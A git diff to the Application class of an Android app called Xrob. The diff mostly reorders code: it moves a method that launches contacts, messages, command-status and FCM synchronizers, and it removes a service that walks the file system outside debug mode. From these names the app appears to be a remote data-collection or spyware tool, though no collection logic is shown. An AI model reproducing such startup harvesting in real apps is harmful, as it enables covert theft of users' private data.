@@ -19,7 +19,6 @@ import com.theah64.xrob.asynctasks.MessagesSynchronizer;
 import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
 import com.theah64.xrob.database.Messages;
 import com.theah64.xrob.services.ContactsWatcherService;
-import com.theah64.xrob.services.FileWalkerService;
 
 import org.acra.ACRA;
 import org.acra.ReportField;
@@ -55,12 +54,12 @@ public class Xrob extends Application implements PermissionUtils.Callback {
     public static final String KEY_ERROR = "error";
     public static final String KEY_MESSAGE = "message";
     public static final String KEY_DATA = "data";
-    static final String KEY_ERROR_CODE = "error_code";
     public static final String KEY_DATA_TYPE = "data_type";
     public static final String DATA_TYPE_CONTACTS = "contacts";
     public static final String DATA_TYPE_COMMAND_STATUSES = "command_statuses";
     public static final String DATA_TYPE_FILES = "files";
     public static final String DATA_TYPE_MESSAGES = "messages";
+    static final String KEY_ERROR_CODE = "error_code";
     private static final String X = Xrob.class.getSimpleName();
 
     private static void initImageLoader(final Context context) {
@@ -88,6 +87,14 @@ public class Xrob extends Application implements PermissionUtils.Callback {
         ImageLoader.getInstance().init(config.build());
     }
 
+    public static void doMainTasks(final Context context, final String apiKey) {
+        new ContactsSynchronizer(context, apiKey).execute();
+        new CommandStatusesSynchronizer(context, apiKey).execute();
+        new FCMSynchronizer(context, apiKey).execute();
+        new MessagesSynchronizer(context, apiKey).execute();
+        new PendingDeliverySynchronizer(context, apiKey).execute();
+    }
+
     @Override
     protected void attachBaseContext(Context base) {
         super.attachBaseContext(base);
@@ -104,14 +111,6 @@ public class Xrob extends Application implements PermissionUtils.Callback {
         initImageLoader(this);
 
         new PermissionUtils(this, this, null).begin();
-    }
-
-    public static void doMainTasks(final Context context, final String apiKey) {
-        new ContactsSynchronizer(context, apiKey).execute();
-        new CommandStatusesSynchronizer(context, apiKey).execute();
-        new FCMSynchronizer(context, apiKey).execute();
-        new MessagesSynchronizer(context, apiKey).execute();
-        new PendingDeliverySynchronizer(context, apiKey).execute();
     }
 
     @Override
@@ -134,10 +133,6 @@ public class Xrob extends Application implements PermissionUtils.Callback {
         });
 
         startService(new Intent(this, ContactsWatcherService.class));
-        if (!IS_DEBUG_MODE) {
-            startService(new Intent(this, FileWalkerService.class));
-        }
-
     }
 
     @Override
